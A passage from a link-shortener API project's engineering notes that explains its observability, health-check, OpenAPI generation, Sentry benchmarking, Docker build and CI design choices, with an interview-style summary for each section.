### Route-pattern aggregation vs. raw-path logging

**What it is.** The request-completion log line
(`src/middleware/requestContext.ts`) now includes a `route` field —
the matched route *pattern* (`/api/links/:id`), not the raw request
path (`/api/links/3f9a1e2c-...`) it already logged as `path`.

**Why it exists in this project.** A raw path is only useful for
looking at one specific request. The moment any path segment is a
UUID, short code, or other per-resource identifier, grouping log lines
by raw path turns "the p95 latency of `GET /api/links/:id`" into
thousands of one-sample groups — every distinct UUID *is* a distinct
"route" from a raw-path grouping's point of view, which makes
aggregation meaningless. This app's own routes make the problem
concrete: `/api/links/:id`, `/api/links/:id/stats`, and the public
`/:shortCode` redirect all embed a variable identifier directly in the
path.

**How it works mechanically.** `requestContext` runs first in the
middleware stack (`src/app.ts`), before Express has matched a route —
so `req.route` doesn't exist yet at "Request started" time. It's only
guaranteed to exist by the time `res.on('finish')` fires, since routing
(and the handler it dispatched to) has already completed by then.
`getRoutePattern` reconstructs the full pattern as
`` `${req.baseUrl}${req.route.path}` ``: `req.baseUrl` holds a
prefix-mounted router's mount point (`/api/links` for `linksRouter`,
`''` for the flat-mounted `redirectRouter`), and `req.route.path` holds
the matched route's own path relative to that mount. A request that
never matches any route at all (a genuine 404, or a body-parse failure
before routing runs) logs the fixed literal `route: 'unmatched'` —
bounded, and not attacker-controlled the way echoing an arbitrary path
back would be. `path` is left alone, still logged for looking at one
specific request — including a quirk worth knowing: inside a
prefix-mounted router, Express strips the mount prefix from `req.url`
for the router's dispatch and doesn't restore it before `finish` fires,
so `path` on a mounted route is itself mount-relative
(`/3f9a1e2c-...`, not `/api/links/3f9a1e2c-...`). `route` is
unaffected by that quirk, which is exactly why it — not `path` — is the
field this phase adds for aggregation.

**Where it lives in the codebase.** `src/middleware/requestContext.ts`
(`getRoutePattern`, and the "Request completed" log call site).
`scripts/log-percentiles.ts` groups by `` `${method} ${route}` ``
specifically, never by `path`. `tests/middleware/requestContext.test.ts`
proves both the prefix-mounted and flat-mounted cases resolve to the
expected pattern, and that an unmatched request logs `'unmatched'`
rather than leaking whatever garbage path was requested.

**Common pitfalls.** Reading `req.route.path` at "Request started"
time — it isn't set yet, since routing hasn't happened. Assuming
`req.path` at `res.on('finish')` reflects the full request path for a
prefix-mounted route — see the mount-relative quirk above.

**Production considerations.** At real scale, this same "aggregate by
pattern, not literal value" principle is exactly what a metrics
backend's label/tag conventions enforce structurally (a Prometheus
histogram labeled by route, for instance) — this phase's log field is
a manual, log-file version of a discipline real metrics tooling bakes
in by design.

**Interview answer.** Grouping request logs by raw path silently stops
working the moment any path has a variable segment — every UUID
becomes its own "route," so there's nothing left to aggregate. I added
a `route` field built from Express's own matched-route metadata
(`req.baseUrl` plus `req.route.path`) specifically so a request to
`/api/links/<any-uuid>` always aggregates under the same key,
`/api/links/:id` — which is also exactly the label convention a real
metrics system like Prometheus would enforce for you automatically.

### A local percentile script, and what this observability setup is NOT

**What it is.** `scripts/log-percentiles.ts` — a `tsx`-run script that
reads NDJSON log lines (from a file or stdin), filters for `"Request
completed"` entries, groups them by `` `${method} ${route}` ``, and
prints p50/p95/p99 per group using the same nearest-rank percentile
method already used by `scripts/bench/clickWriteBench.ts`.

**Why it exists in this project.** The task asked for "a way to
actually look at the aggregate without standing up real
infrastructure" — this is deliberately that and nothing more. It's the
smallest thing that turns a stream of individual request-completion
log lines into an answer to "how slow is `GET /:shortCode` really,"
without adding Prometheus, a hosted APM, or any new always-on process.

**How it works mechanically.** `computePercentiles` is a pure function
over an array of durations (sort, then nearest-rank index per
percentile) — independently testable and reusable. `groupDurationsByRoute`
parses each line as JSON, silently skips anything that isn't a
`"Request completed"` line with the right shape (a non-JSON
`pino-pretty` line, an unrelated log message), and buckets the rest.
`npm run logs:percentiles` runs it as a CLI; nothing here writes state
anywhere or runs on an interval.

**Where it lives in the codebase.** `scripts/log-percentiles.ts`,
`tests/scripts/logPercentiles.test.ts` (percentile math on a known
distribution, and the parsing/grouping logic on a small NDJSON
fixture — independent of any real log file).

**Common pitfalls.** Running this against `NODE_ENV=development`
output: `src/lib/logger.ts`'s `pino-pretty` transport produces
colorized, non-JSON text in development, which this script silently
skips every line of (it looks like it ran successfully and printed
nothing meaningful) — it needs Pino's native NDJSON output, i.e.
production-style logging or a redirected/piped log stream from a
non-development environment.

**Production considerations — what this explicitly does NOT give you.**
This is not distributed tracing: nothing connects a `GET /:shortCode`
request's enqueue to the worker process's later handling of that same
click — Phase 9's queue/worker split means those are two separate log
streams with no shared span or trace ID, only a shared `clickId`/`linkId`
a human can grep for by hand. This is not a real metrics backend:
nothing here is scraped, persisted beyond the log file, alerted on, or
visible without manually running a command — a percentile computed
today tells you nothing about the trend over the last week. At actual
production scale, this is exactly the gap Prometheus + Grafana (pull-based
metrics scraping, real dashboards, alerting rules) or a hosted APM
(Datadog, Honeycomb, Sentry's own Performance product) fill — either
would also solve the tracing gap by propagating a trace ID across the
queue boundary, which nothing in this phase attempts.

**Interview answer.** I built the smallest possible way to answer "how
slow is this route, really" from logs that already exist — a script
that greps NDJSON for completion lines and computes percentiles,
grouped by route pattern. I'd be upfront in an interview that this is
not a metrics backend or tracing: it can't tell you a trend over time,
it can't connect a request to the background job it triggered, and
running it is a manual step, not a dashboard. It's a stopgap that
answers one specific question cheaply, not a replacement for
Prometheus/Grafana or a hosted APM at real scale.

### Queue depth as a third health dependency

**What it is.** `GET /health` (`src/routes/health.ts`) now checks three
dependencies instead of two: Postgres, Redis, and the depth of the
`click-recording` BullMQ queue (`checks.queue` in the response body).

**Why it exists in this project.** Phase 9 already established that a
growing queue backlog is the thing that turns `click_count`'s "bounded
overshoot" claim from a hopeful one into a genuinely bounded one — but
that observation only lived in a 30-second interval log line
(`worker/index.ts`'s `logQueueDepth`) inside the *worker* process.
Nothing outside that process could ask "is the queue currently healthy"
on demand, and nothing fed into the one signal (`/health`'s status
code) that's actually wired to affect traffic routing in a real
deployment.

**How it works mechanically.** `checkQueueDepth`
(`src/services/health.ts`) calls `clickQueue.getWaitingCount()` on the
API process's own `Queue` handle (`src/queues/clickQueue.ts`) —
BullMQ queues are just named Redis key namespaces, so this reads live
state directly from Redis without reaching into the separate worker
process at all. A count over `QUEUE_DEPTH_DEGRADED_THRESHOLD` (100)
reports `'degraded'`; a failed check (e.g. Redis unreachable) reports
`'error'` rather than throwing, matching `checkDatabaseHealth`/
`checkRedisHealth`'s existing never-throws contract. `getHealthReport`
folds all three checks into the same binary `'ok'`/`'degraded'` →
200/503 the route already returned — the response *shape* grew a
field, the response *contract* (status code meaning) didn't change.

**Where it lives in the codebase.** `src/services/health.ts`
(`checkQueueDepth`, `QueueDepthStatus`, the threshold constant),
`src/routes/health.ts` (unchanged — still just maps
`report.status` to a status code). `tests/routes/health.test.ts`
covers all three states (healthy, backed-up/`degraded`, and a rejected
`getWaitingCount` call producing `'error'` without the endpoint
hanging or crashing).

**Common pitfalls.** Checking `link-cleanup` instead of (or in addition
to) `click-recording` — see the next section for why that's the wrong
default. Forcing `checkQueueDepth` into the exact same `timed()` helper
`checkDatabaseHealth`/`checkRedisHealth` already share: that helper's
contract is `() => Promise<boolean>`, and a queue-depth check
fundamentally needs to report a count, not just ok/error — bending a
two-call-site helper into a three-shape one was a worse trade than a
small amount of duplicated timing boilerplate.

**Production considerations.** `QUEUE_DEPTH_DEGRADED_THRESHOLD = 100`
is a starting point, not a tuned number — the same "measure, don't
guess" caveat Phase 7/9 already applied to concurrency numbers applies
here too. A real deployment would also want this exposed as an
alertable time-series (see the previous section's "what this is NOT"),
not just a threshold checked at request time.

**Interview answer.** A health check that only pings its datastores
misses an entire class of degradation this app actually has: a worker
that's falling behind. I added the click-recording queue's waiting
count as a third dependency, reusing the API process's own existing
Queue handle to read it directly from Redis — no new connection, no
reaching into the separate worker process — and folded it into the
same 200/503 contract the endpoint already had, so nothing consuming
`/health` today needs to change to benefit from the new signal.

### Why click-recording, not link-cleanup

**What it is.** The health check's queue-depth check reads only the
`click-recording` queue's waiting count, deliberately not
`link-cleanup`'s.

**Why it exists in this project.** The two queues aren't equally
important to an operator deciding "should traffic keep routing here."
Click-recording is the high-volume, user-facing queue — `worker/index.ts`'s
own comment already calls its depth "the primary health signal for
this process," and a backlog there means real click loss/delay risk at
scale (see "What a consistently growing queue depth means
operationally" below). Link-cleanup is a low-volume scheduled sweep
(one repeatable job, every 60 seconds) — a backlog there means expired
links get deactivated slightly late, which is a correctness nicety, not
a readiness signal worth taking an instance out of rotation over.

**How it works mechanically.** `checkQueueDepth` imports `clickQueue`
specifically (`src/queues/clickQueue.ts`), not `linkCleanupQueue`. The
helper is written narrowly enough — one queue, one threshold — that
adding a second check later (if link-cleanup's backlog ever became
operationally interesting) would mean one more `Promise.all` entry, not
a redesign.

**Where it lives in the codebase.** `src/services/health.ts`.

**Common pitfalls.** Assuming "more checks is strictly better" and
wiring up every queue in the system by default. A health check whose
overall status can flip to `'degraded'` because of a queue nobody
actually needs paged for is worse than not checking it — it trains
whoever's on call to distrust the signal.

**Production considerations.** If link-cleanup ever grew real
operational stakes (e.g. expired links staying reachable for
unacceptably long), the fix would be adding it as its own named check
(`checks.linkCleanupQueue`), not folding it into the existing
`checks.queue` — keeping the two independently visible is what let this
phase pick one now without foreclosing the other later.

**Interview answer.** Not every queue in a system deserves a vote in
whether traffic keeps routing to an instance — I picked click-recording
specifically because it's the one whose backlog has real user-facing
consequences at the volumes this app is built for, and left
link-cleanup out rather than checking it by default just because it
existed. That's a scope decision worth being able to name and defend,
not an oversight.

### What a consistently growing queue depth means operationally

**What it is.** A `waiting` count on the click-recording queue that
climbs over successive `/health` checks (or successive 30-second
`logQueueDepth` log lines in the worker), rather than staying roughly
flat.

**Why it exists in this project.** Phase 9 already established the
mechanism this matters for: `worker/index.ts` comments it directly —
queue lag compounds with the redirect path's cache TTL lag (Phase 8) to
widen `click_count`'s "bounded overshoot" from a bound that holds in
practice to one that only holds on paper. A health check that surfaces
this the moment it starts happening is what makes that bound something
an operator can actually catch, instead of a claim that quietly stops
being true.

**How it works mechanically.** A queue depth that's rising, specifically
(not just nonzero — some waiting jobs at any instant is normal, healthy
throughput), means jobs are being enqueued faster than the worker is
draining them. That has exactly three plausible causes, in the order
Phase 9's existing diagnostic writeup already establishes: worker
concurrency is genuinely too low for current traffic, the worker's
downstream dependency (Postgres, via `worker/db/pool.ts`) is degraded
and each job is taking longer than normal, or the worker process is
down entirely and nothing is draining the queue at all. `/health`'s
`checks.queue` field distinguishes the first two symptoms from a
*Redis*-side problem (an `'error'` status, meaning the check itself
couldn't run) but doesn't by itself distinguish "worker slow" from
"worker down" — that's what checking whether the worker process is
still emitting its own `logQueueDepth`/job-lifecycle log lines is for,
alongside this endpoint, not instead of it.

**Where it lives in the codebase.** `src/services/health.ts`
(`checkQueueDepth`), `worker/index.ts` (`logQueueDepth`, the
complementary always-running signal inside the worker process itself).

**Common pitfalls.** Reading a single `/health` snapshot as
diagnostic on its own. One `waiting: 40` tells you almost nothing;
`waiting: 40` followed by `waiting: 90` followed by `waiting: 180`
across successive checks is the actual signal — the trend, not the
instant value, which is exactly the kind of thing `scripts/log-percentiles.ts`
and this phase's whole "what this isn't" caveat is about: a real
time-series view (Grafana, a hosted APM) would make that trend visible
at a glance instead of requiring an operator to remember the last few
numbers by hand.

**Production considerations.** This is the strongest concrete argument
in this phase for the "what this observability setup does NOT give
you" gap: a rising queue depth is a *trend*, and this phase's tooling
(a threshold-gated health check, a manually-run percentile script) has
no memory of the past — an operator watching `/health` at
30-second intervals by hand can still catch it, but a real deployment
wants that trend graphed and alerted on automatically.

**Interview answer.** A single queue-depth number is close to useless
on its own — what actually matters is whether it's climbing across
successive checks, because that's the signal that the worker is
falling behind rather than just momentarily busy. I built the
snapshot (`/health`'s `checks.queue`) because that's what this phase
could add without new infrastructure, but I'd be direct that catching
the *trend* really wants a time-series tool graphing and alerting on
it, not a person eyeballing a health endpoint every so often.

### Generating an OpenAPI spec from existing Zod schemas, not hand-writing one

**What it is.** `openapi.json`, committed at the repo root, generated
by `npm run openapi:generate` (`scripts/generate-openapi.ts`) from the
same Zod schemas that already validate real request traffic in
`src/routes/{auth,links,redirect}.ts`, plus a small set of
response-shape schemas in `src/openapi/schemas.ts`.

**Why it exists in this project.** A hand-written OpenAPI spec is a
second description of the API that has to be kept in sync with the
first (the actual route code) by discipline alone — exactly the
failure mode the sibling `clickscope-web` repo already documents
concretely: its `src/types/api.ts` is hand-written by reading this
repo's source directly, and its own Notes.md (Phase 12b, "Types
hand-written today, generated in Phase 14") names this as an active
drift risk and points at this exact phase as the fix. Generating from
the request-validation schemas that are already load-bearing (a broken
schema breaks real requests immediately, not just documentation) is
what closes that gap for the request side.

**How it works mechanically.** `@asteasolutions/zod-to-openapi`
(pinned to `^7.3.4` — see "Why zod-to-openapi stays a devDependency"
below) patches Zod's prototype with `extendZodWithOpenApi`, then
`src/openapi/registry.ts` calls `registry.registerPath({...})` once
per route, referencing the *actual* exported schemas from the route
files (`signupSchema`, `createLinkSchema`, `idParamSchema`, etc. — each
of those files only needed one change for this phase: adding `export`
to a `const` that was already a clean, isolated Zod schema) for
request bodies/params/query, and the `src/openapi/schemas.ts` response
schemas for response bodies. `generateOpenApiDocument()` builds the
document via `OpenApiGeneratorV3`, pulling `info.title`/`info.version`
from `src/lib/serviceInfo.ts` (already the single source of truth for
those values elsewhere — `src/app.ts`'s startup log, `GET /`'s
liveness body — so this is a third reuse, not a third place reading
`package.json`). `scripts/generate-openapi.ts` writes the result to
`openapi.json`; `src/routes/docs.ts` reads that committed file once at
import time and serves it via `swagger-ui-express` at `/docs`, and raw
at `/openapi.json`.

**Where it lives in the codebase.** `src/openapi/registry.ts` (the
`registerPath` calls, one per route), `src/openapi/schemas.ts`
(response schemas), `scripts/generate-openapi.ts`, `src/routes/docs.ts`,
`openapi.json` (committed). `tests/openapi/spec.test.ts` validates the
generated document against the OpenAPI 3.0 meta-schema via
`@apidevtools/swagger-parser` (not just "the route responds"), asserts
every one of this API's 15 method+path combinations is present with
exactly the status codes it actually returns, and asserts the
committed `openapi.json` matches a freshly generated document — a
staleness guard that fails the next `npm test` run if a route or
schema changed and nobody re-ran `npm run openapi:generate`.

**Common pitfalls.** Assuming schema-generation alone eliminates all
drift. It closes the *request*-side gap completely (the schemas
generating the spec are the same objects Express validates real
traffic against), but the *response* side is a genuine, smaller
version of the same problem one layer in — see "The response-schema
drift risk" below.

**Production considerations.** `openapi.json` being a committed,
explicitly-regenerated artifact (not regenerated on every server boot)
means `clickscope-web` (or any other consumer) can generate a typed
client against a stable file with a real git history, rather than
against a live server that could change out from under a build.

**Interview answer.** The whole point of generating a spec instead of
hand-writing one is that the thing generating it is the same thing
already enforcing the API's real behavior — these are the literal Zod
schemas Express validates requests against, not a parallel description
someone has to remember to update. That's a stronger guarantee than
"we wrote docs and tried to keep them current," and it's specifically
what the sibling frontend repo's own Notes.md was already waiting on
this phase to provide.

### Why zod-to-openapi stays a devDependency

**What it is.** `@asteasolutions/zod-to-openapi` is a `devDependency`,
never imported by `src/app.ts` or anything that runs in a live request
path — only by `src/openapi/registry.ts`, which itself is only
imported by `scripts/generate-openapi.ts` and by
`tests/openapi/spec.test.ts`.

**Why it exists in this project.** The generated *output*
(`openapi.json`) is what the running server serves; the *generator* is
a build-time tool, structurally no different from `eslint` or
`prettier` already being devDependencies. Shipping it as a runtime
dependency would mean every deploy carries a schema-to-JSON-Schema
conversion library that never actually executes after the build step.

**How it works mechanically.** Pinned to `^7.3.4` specifically, not the
latest major: `npm view` confirms `7.3.4`'s peer dependency is
`zod: ^3.20.2`, matching this repo's installed `zod@^3.24.1`; the
`8.x`/`9.x` line requires `zod@^4`, which this repo doesn't use and
isn't otherwise motivated to adopt just for this. Auto-upgrading past
`7.x` here would have silently broken at the next `npm install` for a
reason completely unrelated to anything this phase changed.

**Where it lives in the codebase.** `package.json` (`devDependencies`),
`src/openapi/registry.ts` and `src/openapi/schemas.ts` (the only two
files that import it).

**Common pitfalls.** Reaching for the newest major version by default
without checking peer-dependency compatibility against the rest of the
project — this repo is intentionally still on Zod v3, and a careless
`npm install @asteasolutions/zod-to-openapi@latest` would have pulled a
version that requires v4 and broken the build immediately.

**Production considerations.** If this repo ever migrates to Zod v4,
`zod-to-openapi` would need to move to `8.x`/`9.x` in the same change —
worth noting as a coupled upgrade, not two independent ones.

**Interview answer.** I checked the actual peer-dependency
compatibility before picking a version, rather than defaulting to
"install latest" — this project is on Zod v3, and zod-to-openapi's 8.x
line requires Zod v4, so pinning to the last v3-compatible release
(`7.3.4`) was a deliberate choice, not an oversight I'd have discovered
later at a broken `npm install`.

### The response-schema drift risk, and its sibling-repo analogue

**What it is.** `src/openapi/schemas.ts` hand-writes Zod schemas for
response shapes (`AuthUserSchema`, `LinkSchema`, `HealthReportSchema`,
etc.) that mirror the *actual* return types (`AuthUser` in
`src/services/authService.ts`, `Link` in `src/services/linkService.ts`)
— because unlike request bodies, nothing in this codebase validates a
response against a Zod schema at runtime; these interfaces are plain
hand-written TypeScript.

**Why it exists in this project.** This is a smaller, one-layer-in
version of exactly the drift risk this whole phase exists to close on
the request side. If `linkService.ts`'s `Link` interface gains a field,
or `authService.ts` renames one, nothing forces
`src/openapi/schemas.ts` to be updated in step — the generated spec
would silently describe a shape that no longer matches what the API
actually returns, and nothing in the test suite would catch it, because
`tests/openapi/spec.test.ts` checks that the spec is internally valid
and covers every route/status code, not that a real response matches
its documented schema.

**How it works mechanically.** There isn't a mechanism that closes
this — that's the point of naming it explicitly rather than letting it
look solved. Two ways to close it, deliberately left for a later
phase: (1) make `Link`/`AuthUser` themselves `z.infer<>` from a Zod
schema instead of a hand-written `interface`, so the response type and
the OpenAPI schema are the same object by construction, the way
request validation already works; or (2) a contract test that runs a
real service call and validates its return value against
`src/openapi/schemas.ts`'s schemas directly, catching drift at test
time instead of never.

**Where it lives in the codebase.** `src/openapi/schemas.ts` (the
doc-comment at the top of the file makes this same point in-repo, for
whoever's reading the code directly rather than Notes.md).

**Common pitfalls.** Treating "we generate the spec from schemas" as a
blanket guarantee against drift, without noticing that guarantee only
holds for the half of the API surface (requests) that was already
schema-validated before this phase started.

**Production considerations.** This is exactly the category of problem
the sibling `clickscope-web` repo's Phase 12b section already names for
its own hand-written `src/types/api.ts` — the fix there was "wait for
Phase 14's OpenAPI spec." This section is the honest disclosure that
Phase 14a moves that problem one layer closer to solved, not all the
way: a generated *client* (a true Phase 14b/consumer-side follow-up)
would still be trusting `src/openapi/schemas.ts`'s accuracy, which
nothing currently verifies against live service code.

**Interview answer.** Generating the spec from Zod schemas solves
drift for request validation completely, because the schema generating
the docs is the literal schema Express validates against. It does not
solve it for responses, because nothing in this codebase validates a
response against a schema at runtime — I wrote hand-mirrored response
schemas instead, and said so directly in both the code and here, rather
than letting "we generate the spec" imply a stronger guarantee than it
actually provides. Naming the boundary of a fix is part of the fix.

### The redirect hot path: measuring, not assuming, Sentry's cost

**What it is.** A direct check that wiring Sentry into this API doesn't
add latency to `GET /:shortCode` — this app's highest-traffic,
intentionally-unthrottled route (Phase 10's rate-limiting section
explicitly exempts it).

**Why it exists in this project.** The architectural argument (no
Sentry Express middleware, no tracing, `Sentry.captureException` only
called from the error handler's 5xx branch and the worker's job-failure
listener — see "Error tracking vs. structured logging" above) implies
zero cost on a successful redirect, since none of Sentry's code runs on
that path at all. An implication isn't a measurement, so this phase
checked it directly instead of asserting it.

**How it works mechanically.** An in-process benchmark (supertest
against the real `app`, 300 iterations of `GET /:shortCode` against a
seeded, non-password-protected link) was run twice: once with
`SENTRY_DSN` unset (Sentry never initialized) and once with a
well-formed fake DSN set (Sentry fully initialized, `beforeSend`
registered, exactly as it would be in production) — measuring end-to-end
request duration via `process.hrtime` around each call. Results:

| | p50 | p95 | p99 | mean |
|---|---|---|---|---|
| `SENTRY_DSN` unset | 1.245ms | 2.467ms | 3.754ms | 1.413ms |
| `SENTRY_DSN` set (Sentry initialized) | 1.131ms | 1.923ms | 2.638ms | 1.219ms |

The Sentry-initialized run was marginally *faster* across every
percentile — well within run-to-run noise for a sub-2ms local
benchmark, not a real effect. The honest conclusion is "no measurable
difference," not "Sentry made it faster."

**Where it lives in the codebase.** The benchmark itself was a
throwaway script (not committed — it isn't a piece of this phase's
deliverable code, just the evidence for this claim), structured like
`scripts/bench/clickWriteBench.ts`: seed a link via the real
`POST /api/links` route, then time repeated `GET /:shortCode` calls
against the real `app` import, comparing the two `SENTRY_DSN` states as
separate process runs (Sentry's init state is a module-level singleton
set once at process start, so toggling it mid-process isn't
meaningful).

**Common pitfalls.** Trusting the architectural argument alone
("Sentry isn't called on this path, so it must be free") without
measuring — that argument is about *call count*, not about whether
`Sentry.init()` itself installs anything with steady-state cost
(instrumented globals, patched built-ins) that could tax every request
regardless of whether `captureException` is ever invoked. Measuring is
what rules that out empirically instead of by assumption.

**Production considerations.** This benchmark is local, single-process,
and un-loaded (no concurrent traffic) — it answers "does Sentry add
per-request overhead," not "does Sentry change this service's behavior
under real production load or memory pressure." A real capacity check
before a production Sentry rollout would want a proper load test
(k6, autocannon) under realistic concurrency, which this phase
deliberately didn't add as a new dependency for a one-time check (see
"Not added" in the dependency table).

**Interview answer.** I didn't just argue Sentry was free on the hot
path because it's architecturally never called there — I measured it,
300 iterations each way, with Sentry fully initialized versus not.
The two runs were statistically indistinguishable, with the
Sentry-on run actually coming in marginally faster, which is exactly
what "no measurable cost" should look like for a sub-2ms local
benchmark. Stating a performance claim without the number behind it is
a habit worth not having.

## Phase 15a: Containerization & CI

### Multi-stage builds and layer caching

**What it is.** Two files, `Dockerfile.api` and `Dockerfile.worker`, each
with the same four-stage shape (`deps` → its own build stage →
`runtime-base` → a final stage), producing two separate,
independently-taggable images via `docker build -f Dockerfile.api ...`
and `docker build -f Dockerfile.worker ...`. Originally this was one
`Dockerfile` with six named stages and two build targets
(`docker build --target api` / `--target worker`); it was split into two
files for a deploy-platform reason unrelated to the caching mechanics
described below — see "One repo, two deployable images" further down for
why.

**Why it exists in this project.** The API and worker are one npm
package with one `node_modules` tree (see CLAUDE.md: "worker/ — separate
process, separate deploy," not a separate package) but two different
entrypoints and two different `tsc` projects (`tsconfig.json` vs.
`worker/tsconfig.json`). A naive single-stage build would need
`typescript`, `vitest`, `tsx`, `eslint`, and every other devDependency
installed in the image that actually runs in production, just because
they were needed to produce `dist/`. Multi-stage builds let the
*compile* environment and the *run* environment diverge completely —
only the compiled JavaScript crosses the boundary via `COPY --from=`.

**How it works mechanically.** Each file's `deps` stage runs `npm ci`
once; each file's build stage copies in only what it needs to compile
(`Dockerfile.api`'s `build-api` gets `tsconfig.json` + `src/`;
`Dockerfile.worker`'s `build-worker` gets `tsconfig.json`/`src/` and
`worker/`, because `worker/tsconfig.json` extends the root config and
imports two `src/` files directly) and runs its own `tsc` invocation.
`runtime-base` in each file starts from a *fresh* `node:24-alpine`, not
from either build stage, and runs a second, independent `npm ci
--omit=dev` against the same lockfile — this is deliberate, not wasteful:
reusing the build stage's `node_modules` via `COPY --from=build-api
/app/node_modules` would drag every devDependency into the shipped image.
Each file's final stage then `COPY --from=` only the compiled `dist/`
output from its own build stage. Docker caches each `RUN`/`COPY`
instruction as a layer keyed on its inputs, so instruction *order*
matters: `package.json` and `package-lock.json` are copied and `npm
ci`'d **before** any source file is copied, in every stage that installs
dependencies, in both files. A commit that only touches `.ts` files (the
overwhelming majority) never invalidates the `npm ci` layer — Docker
reuses it from cache, and each build only re-runs `tsc` and the final
`COPY`. Because Docker's layer cache is content-addressed rather than
file-scoped, `Dockerfile.api`'s and `Dockerfile.worker`'s identical
`deps` stages can still share cached layers with each other on the same
machine, even though they're defined in two separate files.

**Where it lives in the codebase.** `Dockerfile.api`, `Dockerfile.worker`
(repo root).

**Common pitfalls.** Copying the entire repo (`COPY . .`) before running
`npm ci` is the single most common way to defeat layer caching — it
means *any* file change, including a one-line comment edit, invalidates
the dependency-install layer and forces a full reinstall on every build.
The fix is exactly the ordering above: dependency manifests first,
source second. A second pitfall specific to this repo: `worker/`'s build
needs a full copy of `src/` (not just the two files it imports), because
`COPY` operates on whole directories and TypeScript's own module
resolution needs the rest of `src/` present on disk even though only
`src/queues/contracts.ts` and `src/lib/sentryScrub.ts` end up compiled
into `worker/tsconfig.json`'s `include` list.

**Production considerations.** Image size is the direct payoff:
`runtime-base`'s `npm ci --omit=dev` plus alpine's small footprint keeps
both final images well under what a single-stage build (devDependencies
and all) would produce, which matters for both registry storage cost and
container cold-start pull time. The cache-locality payoff (fast
rebuilds on code-only changes) matters more in CI, where every PR
triggers a fresh `docker build`.

**Interview answer.** Multi-stage builds let me separate "what it takes
to compile this code" from "what it takes to run it" — the build stage
gets the full devDependency tree and a `tsc` invocation, but only the
compiled JavaScript crosses into the final image via `COPY --from=`.
Combined with copying `package.json` before source, this means a
code-only change reuses the cached dependency-install layer instead of
reinstalling `node_modules` on every build, and the shipped image never
carries `typescript`, `vitest`, or any other tool that only existed to
produce it.

### Non-root containers

**What it is.** Both final images run as the `node` user
(`USER node` in `runtime-base`, inherited by both `api` and `worker`),
not as `root`, which is Docker's default if no `USER` is specified.

**Why it exists in this project.** If a dependency has a
remote-code-execution vulnerability, or the app itself has an injection
flaw that lets an attacker run arbitrary shell commands inside the
container, running as `root` means that code executes with root
privileges *inside the container* — able to modify any file the image
ships, install packages, or (depending on how the container was
launched) reach further than intended into the host. Running as a
low-privilege user doesn't prevent every kind of container escape, but
it removes an entire, easy class of "escalate from arbitrary code
execution to full control of the container" for free.

**How it works mechanically.** `node:24-alpine` already creates a
`node` user (uid/gid 1000) as part of the base image — no manual
`RUN addgroup && adduser` is needed. `USER node` in `runtime-base`
switches the effective user for every instruction after it (and for the
final `CMD`) in both the `api` and `worker` stages that build from it.
`COPY --chown=node:node` is used for every file copied into the runtime
stages (`dist/`, `openapi.json`) so those files are actually owned by
the user that will read them — copying as `root` and then switching
`USER` would leave root-owned files that a non-root process still has
read access to (fine here, since nothing needs write access at runtime),
but explicit ownership is the more correct pattern in general and costs
nothing.

**Where it lives in the codebase.** `Dockerfile.api`, `Dockerfile.worker`
— each file's `runtime-base` stage.

**Common pitfalls.** Binding to a port below 1024 requires root
privileges on Linux — irrelevant here since `PORT` defaults to 3000, but
worth knowing as the reason some containerized services stay on root
despite the security tradeoff. Forgetting `--chown` on `COPY` after
switching `USER` is the more likely mistake: the copied files remain
owned by whichever user ran the `COPY` instruction (root, since `COPY`
itself doesn't run as the container's runtime user), which is harmless
for read-only files but breaks anything the app tries to write to that
path at runtime.

**Production considerations.** This is table-stakes for any image
pushed to a real registry or run under a platform with pod security
policies (Kubernetes, many managed container platforms reject or flag
images that declare `USER root` or specify no `USER` at all). Costs
nothing here since neither the API nor the worker writes to its own
filesystem at runtime — everything persistent lives in Postgres/Redis.

**Interview answer.** Non-root containers limit the blast radius of a
code-execution vulnerability — if an attacker gets arbitrary code
running inside the container, they get it as a low-privilege user, not
root. `node:24-alpine` ships a `node` user out of the box, so this cost
nothing beyond one `USER node` line and remembering `--chown` on the
`COPY` instructions that populate the runtime stage.

### CI service containers and health checks

**What it is.** `.github/workflows/ci.yml`'s `test` job declares
`postgres:16` and `redis:7` as `services:` — GitHub Actions spins up
both as sibling containers alongside the job's own runner container for
the job's duration, torn down automatically when the job finishes.

**Why it exists in this project.** This test suite is deliberately not
built on mocks — `tests/globalSetup.ts` connects to a real Postgres,
creates a `clickscope_test` database, and runs every migration through
it before any test runs (see Phase 13a's "inverted pyramid" reasoning).
CI has to reproduce that same real-database posture, not substitute
something lighter, or CI would be testing a meaningfully different
system than what `npm test` verifies locally.

**How it works mechanically.** Each `services:` entry's `options:`
block wires in a `--health-cmd` (the same `pg_isready`/`redis-cli ping`
checks the local `docker-compose.yml` already uses) — GitHub Actions
won't start the job's own steps until every service container reports
healthy, so `npm run migrate:up` in step 5 never races an
still-initializing Postgres. Because the `test` job doesn't wrap itself
in a `container:` block (it runs directly on the `ubuntu-latest` runner
VM, not inside a container of its own), Actions automatically publishes
each service's `ports:` mapping onto the runner's own `localhost` — which
is exactly what `.env.test.example`'s `DATABASE_URL=postgres://…@localhost:5432/…`
and `REDIS_URL=redis://localhost:6379` already assume, so the committed
dummy-value file works in CI completely unmodified.

**Where it lives in the codebase.** `.github/workflows/ci.yml`,
`test` job's `services:` block.

**Common pitfalls.** Omitting the health-check options is the most
common mistake — without them, Actions considers a service "up" the
moment its container process starts, not once it's actually accepting
connections, and the very next step (`npm run migrate:up`) can then fail
intermittently against a Postgres that's still initializing its data
directory. The other common mistake is wrapping the job in a
`container:` block without realizing that changes how service ports are
reached (via the service's container name as hostname, not
`localhost`) — this workflow deliberately avoids that, keeping
`.env.test.example`'s existing `localhost` URLs valid.

**Production considerations.** Service containers only exist for the
duration of the CI job — they have no relationship to the real Postgres/
Redis this API talks to once deployed (Phase 15c's concern). Their only
job is giving CI a real, disposable, correctly-versioned (16/7, matching
`docker-compose.yml` and this Dockerfile's own image choices) database
and cache to run the actual test suite against.

**Interview answer.** GitHub Actions' `services:` block gives a CI job
real, disposable sibling containers for the job's duration, health-
checked before the job's own steps run. Because this job isn't wrapped
in its own `container:`, those services are reachable on `localhost` at
their mapped ports — the same URLs the committed `.env.test.example`
already uses for local development, so no CI-specific environment
branching was needed.

### The migration race on concurrent deploys, and why migrations don't run on container boot

**What it is.** Neither the `api` nor `worker` image runs
`npm run migrate:up` (or anything migration-related) as part of its
`CMD` or startup sequence. Migrations are, and will remain in Phase
15c, a separate, explicit step — never something that happens
automatically when a container starts.

**Why it exists in this project.** Two independent reasons, one
structural and one about correctness under concurrency. Structurally:
`node-pg-migrate` is a devDependency (see `package.json`), and both
final images install with `npm ci --omit=dev` in `runtime-base` — the
